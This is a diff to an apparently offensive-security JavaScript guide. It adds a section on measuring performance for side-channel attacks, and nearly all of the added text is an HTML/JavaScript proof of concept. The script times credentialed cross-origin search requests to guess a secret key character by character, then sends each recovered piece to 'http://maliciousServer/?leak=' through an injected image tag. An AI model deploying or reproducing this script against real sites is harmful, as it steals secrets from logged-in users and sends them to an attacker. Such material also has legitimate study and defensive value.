@@ -5,6 +5,7 @@
 3. [CONTROL WINDOW SIDEBAR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#control-window-sidebar-webconsole)
 4. [CSRF](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#csrf)
 5. [NORMALIZE STRING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#normalize-string)
+6. [MEASURE PERFORMANCE (SIDE CHANNEL ATTACK)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#measure-performance)
 
 <br />
 
@@ -95,4 +96,56 @@ console.log('Normalize:', x.normalize('NFKD'))
   const t1 = performance.now();
   console.log(`Call to doSomething took ${t1 - t0} milliseconds.`);
 </script>
+```
+
+- Script to measure time difference while guessing key
+- Sending correct guess back to own server
+```
+<!DOCTYPE html>
+<body onload="document.getElementById('attack');">
+<script id="attack">
+
+var str = "0123456789-abcdef".split("");
+var base = "http://vulnerable.com/search?search=^";
+var key = "";
+var i = 0;
+
+function check(key, i) {
+  url = base + key + str[i];
+  t0 = performance.now();
+  fetch(
+    url,
+    {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'no-cors'
+    }
+  ).catch(err => {
+      console.log("ERR");
+  }).then(response => {
+      t1 = performance.now();
+      if (t1-t0 > 3000 ) {
+          document.write("<br /> [+] "+str[i]+" "+(t1-t0).toString());
+          key += str[i];
+          document.write('<img src="http://maliciousServer/?leak='+key+'" />');
+          j = 0;
+          while (j < str.length){
+            check(key,j);
+            j+=1;
+          }
+
+      } else {
+          document.write("<br /> [x]"+str[i]+" "+(t1-t0).toString());
+    }
+  });
+}
+
+while (i < str.length) {
+  setTimeout(check(key, i), 500*i);
+  i+=1;
+}
+
+</script>
+</body>
+</html>
 ```
